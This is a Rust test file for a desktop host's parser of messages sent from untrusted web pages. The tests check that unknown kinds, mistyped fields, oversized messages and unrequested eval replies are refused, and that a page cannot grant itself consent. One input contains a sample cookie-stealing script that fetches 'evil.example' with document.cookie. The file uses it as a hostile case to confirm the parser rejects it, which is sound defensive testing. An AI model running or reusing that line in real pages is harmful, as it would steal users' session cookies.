//! The hostile-input boundary. Included by `ipc.rs`.
//!
//! Every case here is something a page can actually send. The page is arbitrary
//! — it may be an app the user trusts, a page that app was redirected to, or an
//! advert in an iframe on either — so "no legitimate page would do that" is not
//! a reason to leave a hole.

use super::*;

fn problem(raw: &str) -> PageMessageProblem {
    parse_page_message(raw).unwrap_err()
}

// ---------------------------------------------------------------------------
// The shapes that are accepted
// ---------------------------------------------------------------------------

#[test]
fn a_console_message_parses() {
    assert_eq!(
        parse_page_message(r#"{"kind":"console","method":"warn","text":"careful"}"#).unwrap(),
        PageMessage::Console {
            method: "warn".into(),
            text: "careful".into()
        }
    );
}

#[test]
fn a_page_error_parses_and_is_its_own_kind() {
    // Not a console message: routing it through `classify_level` would rank it
    // `Other`, and the page genuinely threw.
    assert_eq!(
        parse_page_message(r#"{"kind":"pageError","source":"onerror","text":"boom"}"#).unwrap(),
        PageMessage::PageError {
            source: "onerror".into(),
            text: "boom".into()
        }
    );
}

#[test]
fn a_title_message_parses() {
    assert_eq!(
        parse_page_message(r#"{"kind":"title","text":"Orders"}"#).unwrap(),
        PageMessage::Title {
            text: "Orders".into()
        }
    );
}

#[test]
fn a_full_network_row_parses() {
    let message = parse_page_message(
        r#"{"kind":"network","source":"fetch","url":"https://a/api","method":"POST","status":201,"durationMs":12.5,"transferSize":900}"#,
    )
    .unwrap();
    assert_eq!(
        message,
        PageMessage::Network {
            url: "https://a/api".into(),
            method: "POST".into(),
            status: Some(201),
            duration_ms: Some(12.5),
            transfer_size: Some(900),
            source: NetworkSource::Fetch,
        }
    );
}

#[test]
fn a_resource_row_with_no_status_parses_because_that_is_a_real_answer() {
    // A `PerformanceObserver` row genuinely has no status, and never will.
    let message = parse_page_message(
        r#"{"kind":"network","source":"resource","url":"https://a/x.png","method":"GET","status":null,"durationMs":3,"transferSize":null}"#,
    )
    .unwrap();
    match message {
        PageMessage::Network { status, source, .. } => {
            assert_eq!(status, None);
            assert_eq!(source, NetworkSource::Resource);
        }
        other => panic!("{other:?}"),
    }
}

#[test]
fn an_absent_optional_field_is_the_same_as_a_null_one() {
    let message =
        parse_page_message(r#"{"kind":"network","source":"xhr","url":"u","method":"GET"}"#)
            .unwrap();
    match message {
        PageMessage::Network {
            status,
            duration_ms,
            transfer_size,
            ..
        } => {
            assert_eq!((status, duration_ms, transfer_size), (None, None, None));
        }
        other => panic!("{other:?}"),
    }
}

#[test]
fn an_eval_reply_parses() {
    assert_eq!(
        parse_page_message(r#"{"kind":"evalReply","id":7,"payload":"{\"ok\":true}"}"#).unwrap(),
        PageMessage::EvalReply {
            id: 7,
            payload: "{\"ok\":true}".into()
        }
    );
}

#[test]
fn an_unknown_field_on_a_known_kind_is_ignored_rather_than_refused() {
    // Forward compatibility in the direction that is safe: the fields this app
    // reads are all present and well-typed, and an extra one causes nothing.
    assert!(parse_page_message(
        r#"{"kind":"title","text":"x","somethingNew":{"a":1},"__proto__":"y"}"#
    )
    .is_ok());
}

// ---------------------------------------------------------------------------
// An unknown kind is counted, not applied
// ---------------------------------------------------------------------------

#[test]
fn an_unknown_kind_is_refused_with_the_kind_preserved() {
    // An `_ => {}` arm would make a probing page invisible, and a fallback to
    // the nearest known kind would let the page choose.
    match problem(r#"{"kind":"navigate","url":"https://evil.example/"}"#) {
        PageMessageProblem::UnknownKind { kind } => assert_eq!(kind, "navigate"),
        other => panic!("{other:?}"),
    }
}

#[test]
fn no_unknown_kind_is_ever_treated_as_a_known_one() {
    // These are the shapes a page that has worked out the protocol would try,
    // including near-misses of real kinds.
    for raw in [
        r#"{"kind":"Console","method":"error","text":"fake"}"#,
        r#"{"kind":"console ","method":"error","text":"fake"}"#,
        r#"{"kind":"consoleMessage","method":"error","text":"fake"}"#,
        r#"{"kind":"eval","script":"fetch('https://evil.example/'+document.cookie)"}"#,
        r#"{"kind":"setConsent","reads":true,"writes":true}"#,
        r#"{"kind":"","text":"x"}"#,
    ] {
        match parse_page_message(raw) {
            Err(PageMessageProblem::UnknownKind { .. }) => {}
            other => panic!("{raw} -> {other:?}"),
        }
    }
}

#[test]
fn a_page_cannot_grant_itself_consent_through_this_channel() {
    // The whole surface is two effects: append to a ring, or resolve a pending
    // evaluation. Consent is not one of them and there is no kind for it.
    assert!(parse_page_message(r#"{"kind":"consent","reads":true,"writes":true}"#).is_err());
    assert!(parse_page_message(r#"{"kind":"automationConsent","origin":"https://a"}"#).is_err());
}

// ---------------------------------------------------------------------------
// Malformed and mistyped
// ---------------------------------------------------------------------------

#[test]
fn something_that_is_not_json_is_refused() {
    match problem("not json at all") {
        PageMessageProblem::NotJson { .. } => {}
        other => panic!("{other:?}"),
    }
    assert!(matches!(problem(""), PageMessageProblem::NotJson { .. }));
}

#[test]
fn json_that_is_not_an_object_is_refused() {
    for raw in ["[]", "\"console\"", "7", "null", "true"] {
        assert_eq!(problem(raw), PageMessageProblem::NotAnObject, "{raw}");
    }
}

#[test]
fn a_message_with_no_string_kind_is_refused() {
    for raw in [
        "{}",
        r#"{"kind":7}"#,
        r#"{"kind":null}"#,
        r#"{"kind":["console"]}"#,
        r#"{"Kind":"console"}"#,
    ] {
        assert_eq!(problem(raw), PageMessageProblem::NoKind, "{raw}");
    }
}

#[test]
fn a_console_payload_that_is_not_a_string_is_refused_not_coerced() {
    // `text: 5` is not `"5"`, and `text: {toString: …}` is a page trying to be
    // helpful. The field's type is part of the contract.
    for (raw, field, found) in [
        (
            r#"{"kind":"console","method":"log","text":5}"#,
            "text",
            "a number",
        ),
        (
            r#"{"kind":"console","method":"log","text":{"toString":"x"}}"#,
            "text",
            "an object",
        ),
        (
            r#"{"kind":"console","method":"log","text":null}"#,
            "text",
            "null",
        ),
        (r#"{"kind":"console","method":"log"}"#, "text", "absent"),
        (
            r#"{"kind":"console","method":5,"text":"x"}"#,
            "method",
            "a number",
        ),
        (
            r#"{"kind":"console","method":["log"],"text":"x"}"#,
            "method",
            "an array",
        ),
    ] {
        match problem(raw) {
            PageMessageProblem::WrongType {
                kind,
                field: got,
                found: saw,
                ..
            } => {
                assert_eq!(kind, "console");
                assert_eq!(got, field, "{raw}");
                assert_eq!(saw, found, "{raw}");
            }
            other => panic!("{raw} -> {other:?}"),
        }
    }
}

#[test]
fn a_wrong_type_refusal_names_the_field_and_what_was_expected() {
    let message = problem(r#"{"kind":"console","method":"log","text":5}"#).to_string();
    assert!(message.contains("\"text\""), "{message}");
    assert!(message.contains("a number"), "{message}");
    assert!(message.contains("a string"), "{message}");
}

#[test]
fn an_unrecognised_network_source_is_refused_rather_than_defaulted() {
    // Defaulting to `resource` inverts the honesty the field exists for:
    // `resource` is the least capable source, so a mislabelled `fetch` row
    // would claim it has no status when it does — and a page could label its
    // own fabricated rows however it liked.
    for raw in [
        r#"{"kind":"network","source":"devtools","url":"u","method":"GET"}"#,
        r#"{"kind":"network","source":"Fetch","url":"u","method":"GET"}"#,
        r#"{"kind":"network","source":null,"url":"u","method":"GET"}"#,
        r#"{"kind":"network","url":"u","method":"GET"}"#,
        r#"{"kind":"network","source":1,"url":"u","method":"GET"}"#,
    ] {
        match problem(raw) {
            PageMessageProblem::WrongType { field, .. } => assert_eq!(field, "source", "{raw}"),
            other => panic!("{raw} -> {other:?}"),
        }
    }
}

#[test]
fn a_status_outside_the_range_of_a_status_code_is_refused() {
    for raw in [
        r#"{"kind":"network","source":"fetch","url":"u","method":"GET","status":99999}"#,
        r#"{"kind":"network","source":"fetch","url":"u","method":"GET","status":-1}"#,
        r#"{"kind":"network","source":"fetch","url":"u","method":"GET","status":"200"}"#,
        r#"{"kind":"network","source":"fetch","url":"u","method":"GET","status":200.5}"#,
    ] {
        match problem(raw) {
            PageMessageProblem::WrongType { field, .. } => assert_eq!(field, "status", "{raw}"),
            other => panic!("{raw} -> {other:?}"),
        }
    }
}

#[test]
fn a_negative_or_non_finite_duration_is_refused_rather_than_clamped() {
    // A clamped zero looks like a very fast request, which is a wrong answer
    // rather than a missing one.
    for raw in [
        r#"{"kind":"network","source":"fetch","url":"u","method":"GET","durationMs":-5}"#,
        r#"{"kind":"network","source":"fetch","url":"u","method":"GET","durationMs":"fast"}"#,
    ] {
        match problem(raw) {
            PageMessageProblem::WrongType { field, .. } => assert_eq!(field, "durationMs", "{raw}"),
            other => panic!("{raw} -> {other:?}"),
        }
    }
}

#[test]
fn a_non_numeric_or_negative_eval_id_is_refused() {
    for raw in [
        r#"{"kind":"evalReply","id":"7","payload":"x"}"#,
        r#"{"kind":"evalReply","id":-7,"payload":"x"}"#,
        r#"{"kind":"evalReply","id":7.5,"payload":"x"}"#,
        r#"{"kind":"evalReply","payload":"x"}"#,
    ] {
        match problem(raw) {
            PageMessageProblem::WrongType { field, .. } => assert_eq!(field, "id", "{raw}"),
            other => panic!("{raw} -> {other:?}"),
        }
    }
}

#[test]
fn a_message_over_the_size_cap_is_refused_before_it_is_parsed() {
    // The page controls the length and the host allocates.
    let huge = format!(
        r#"{{"kind":"title","text":"{}"}}"#,
        "x".repeat(MAX_MESSAGE_BYTES + 1)
    );
    match problem(&huge) {
        PageMessageProblem::TooLarge { size, limit } => {
            assert!(size > MAX_MESSAGE_BYTES);
            assert_eq!(limit, MAX_MESSAGE_BYTES);
        }
        other => panic!("{other:?}"),
    }
}

#[test]
fn a_message_just_under_the_cap_is_still_parsed() {
    // The cap must not be so eager that ordinary capped console lines bounce.
    let text = "x".repeat(1000);
    let raw = format!(r#"{{"kind":"title","text":"{text}"}}"#);
    assert!(parse_page_message(&raw).is_ok());
}

// ---------------------------------------------------------------------------
// Eval replies must be wanted
// ---------------------------------------------------------------------------

#[test]
fn an_eval_reply_for_an_unknown_id_is_refused() {
    // The ids are the host's own. A page guessing one could otherwise answer a
    // request it was never asked, and the answer would be attributed to a
    // script this app wrote.
    match accept_eval_reply(7, &[1, 2, 3]) {
        Err(PageMessageProblem::UnknownEvalId { id }) => assert_eq!(id, 7),
        other => panic!("{other:?}"),
    }
}

#[test]
fn an_eval_reply_with_nothing_pending_is_refused() {
    assert!(accept_eval_reply(1, &[]).is_err());
}

#[test]
fn an_eval_reply_for_a_pending_id_is_accepted() {
    assert_eq!(accept_eval_reply(2, &[1, 2, 3]).unwrap(), 2);
}

#[test]
fn parsing_a_reply_does_not_by_itself_make_it_wanted() {
    // The two steps are separate on purpose: parsing knows the message's shape
    // and nothing about the host's state.
    let message = parse_page_message(r#"{"kind":"evalReply","id":99,"payload":"x"}"#).unwrap();
    match message {
        PageMessage::EvalReply { id, .. } => assert!(accept_eval_reply(id, &[1]).is_err()),
        other => panic!("{other:?}"),
    }
}
